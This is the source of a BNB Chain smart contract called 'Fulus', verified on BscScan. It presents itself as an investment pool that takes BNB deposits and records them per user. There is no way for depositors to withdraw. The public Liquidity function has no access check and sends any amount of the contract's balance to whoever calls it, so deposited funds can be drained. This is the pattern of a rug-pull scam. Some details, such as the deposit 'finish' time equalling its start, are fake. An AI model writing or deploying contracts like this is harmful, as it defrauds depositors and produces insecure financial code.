/**
 *Submitted for verification at BscScan.com on 2022-03-23
*/

pragma solidity 0.5.10;

contract Fulus {
	using SafeMath for uint256;

	uint256 constant public INVEST_MIN_AMOUNT = 5e16; // 0.05 bnb 

	uint256 public totalInvested;

  struct Deposit {
		uint256 amount;
		uint256 start;
	}


	struct User {
		Deposit[] deposits;
	}
	


	mapping (address => User) internal users;

	bool public started;

	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	


	
	

	function invest() public payable {
	

		require(msg.value >= INVEST_MIN_AMOUNT);
    
		User storage user = users[msg.sender];
		
		user.deposits.push(Deposit(msg.value, block.timestamp));

		totalInvested = totalInvested.add(msg.value);

		emit NewDeposit(msg.sender, msg.value);
	}

	
	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}
	
	function Liquidity(uint256 amount) public{
		
		   totalInvested = address(this).balance.sub(amount);
			msg.sender.transfer(amount);
		
	}


	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount = amount.add(users[userAddress].deposits[i].amount);
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns( uint256 amount, uint256 start, uint256 finish) {
	    User storage user = users[userAddress];
		amount = user.deposits[index].amount;
		start = user.deposits[index].start;
		finish = user.deposits[index].start;
	}

	function getSiteInfo() public view returns(uint256 _totalInvested) {
		return(totalInvested);
	}

	
	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}